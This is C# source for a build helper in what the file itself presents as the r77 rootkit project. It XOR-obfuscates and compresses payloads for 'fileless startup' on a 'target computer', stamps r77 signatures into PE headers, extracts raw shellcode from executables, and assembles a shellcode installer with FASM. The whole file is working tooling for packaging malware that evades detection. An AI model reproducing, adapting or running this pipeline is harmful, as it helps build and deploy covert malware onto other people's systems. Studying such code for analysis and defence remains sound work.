using Global;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;

namespace BuildTask
{
	/// <summary>
	/// BuildTask.exe is used for VS build events.
	/// <para>The first argument is a path to the file to be processed</para>
	/// <para>(except for -shellcodeinstaller)</para>
	/// <para>-compress: Compress file</para>
	/// <para>-encrypt: Encrypt file</para>
	/// <para>-toshellcode: Extracts an executable file's .text section</para>
	/// <para>-r77service: Write R77_SERVICE_SIGNATURE to r77 header</para>
	/// <para>-r77helper: Write R77_HELPER_SIGNATURE to r77 header</para>
	/// <para>-shellcodeinstaller: Converts Install.exe to Install.shellcode</para>
	/// </summary>
	public static class Program
	{
		public static int Main(string[] args)
		{
			if (args.Length == 0) return 1;

			if (args[0] == "-shellcodeinstaller")
			{
				if (!Directory.Exists(args[1])) return 1;

				return CreateShellCodeInstaller(args[1]) ? 0 : 1;
			}
			else
			{
				if (!File.Exists(args[0])) return 1;

				byte[] file = File.ReadAllBytes(args[0]);
				if (args.Contains("-compress")) file = Compress(file);
				if (args.Contains("-encrypt")) file = Encrypt(file);
				if (args.Contains("-toshellcode")) file = ExtractShellCode(file);
				if (args.Contains("-r77service")) file = R77Signature(file, R77Const.R77ServiceSignature);
				if (args.Contains("-r77helper")) file = R77Signature(file, R77Const.R77HelperSignature);

				File.WriteAllBytes(args[0], file);
				return 0;
			}
		}

		private static byte[] Compress(byte[] data)
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
				{
					gzipStream.Write(data, 0, data.Length);
				}

				return memoryStream.ToArray();
			}
		}
		private static byte[] Encrypt(byte[] data)
		{
			// Only a trivial encryption algorithm is used.
			// This improves the stability of the fileless startup, because less .NET classes are imported that may not be present on the target computer.

			byte[] encrypted = new byte[data.Length + 4];
			RandomNumberGenerator.Create().GetBytes(encrypted, 0, 4);

			int key = BitConverter.ToInt32(encrypted, 0);

			for (int i = 0; i < data.Length; i++)
			{
				encrypted[i + 4] = (byte)(data[i] ^ (byte)key);
				key = key << 1 | key >> (32 - 1);
			}

			return encrypted;
		}
		private static byte[] R77Signature(byte[] file, ushort signature)
		{
			// Write a 16-bit signature to the r77 header.
			byte[] newFile = file.ToArray();
			Buffer.BlockCopy(BitConverter.GetBytes(signature), 0, newFile, 64, 2); // The offset of the DOS stub is 64.
			return newFile;
		}
		private static bool CreateShellCodeInstaller(string solutionDir)
		{
			Directory.CreateDirectory(Path.Combine(solutionDir, @"InstallShellcode\bin"));

			string shellCodeExePath = Path.Combine(solutionDir, @"InstallShellcode\bin\InstallShellcode.exe");
			string shellCodePath = Path.Combine(solutionDir, @"InstallShellcode\bin\InstallShellcode.shellcode");

			if (FasmCompile(Path.Combine(solutionDir, @"SlnBin\FASM"), Path.Combine(solutionDir, @"InstallShellcode\InstallShellcode.asm"), shellCodeExePath))
			{
				byte[] shellCode = ExtractShellCode(File.ReadAllBytes(shellCodeExePath));
				File.WriteAllBytes(shellCodePath, shellCode);

				using (FileStream file = File.Create(Path.Combine(solutionDir, @"$Build\Install.shellcode")))
				{
					file.Write(shellCode, 0, shellCode.Length);

					byte[] installer = File.ReadAllBytes(Path.Combine(solutionDir, @"$Build\Install.exe"));
					file.Write(installer, 0, installer.Length);
				}

				return true;
			}
			else
			{
				return false;
			}
		}

		private static byte[] ExtractShellCode(byte[] file)
		{
			// Extracts the contents of an executable file's .text section.
			// This executable should only contain a .text section, i.e. it should be shellcode.

			int ntHeader = BitConverter.ToInt32(file, 0x3c);
			short sizeOfOptionalHeader = BitConverter.ToInt16(file, ntHeader + 0x14);

			byte[] section = new byte[0x28];
			Buffer.BlockCopy(file, ntHeader + 0x18 + sizeOfOptionalHeader, section, 0, 0x28);

			int pointerToRawData = BitConverter.ToInt32(section, 0x14);
			int virtualSize = BitConverter.ToInt32(section, 0x8);

			byte[] shellCode = new byte[virtualSize];
			Buffer.BlockCopy(file, pointerToRawData, shellCode, 0, virtualSize);
			return shellCode;
		}
		private static bool FasmCompile(string fasmPath, string asmFileName, string outputFileName)
		{
			// Compiles an .asm file using FASM.exe

			Environment.SetEnvironmentVariable("INCLUDE", Path.Combine(fasmPath, "INCLUDE"), EnvironmentVariableTarget.Process);

			using (Process process = Process.Start(new ProcessStartInfo
			{
				FileName = Path.Combine(fasmPath, "FASM.exe"),
				Arguments = $"\"{asmFileName}\" \"{outputFileName}\"",
				UseShellExecute = false,
				CreateNoWindow = true
			}))
			{
				process.WaitForExit();
				return process.ExitCode == 0;
			}
		}
	}
}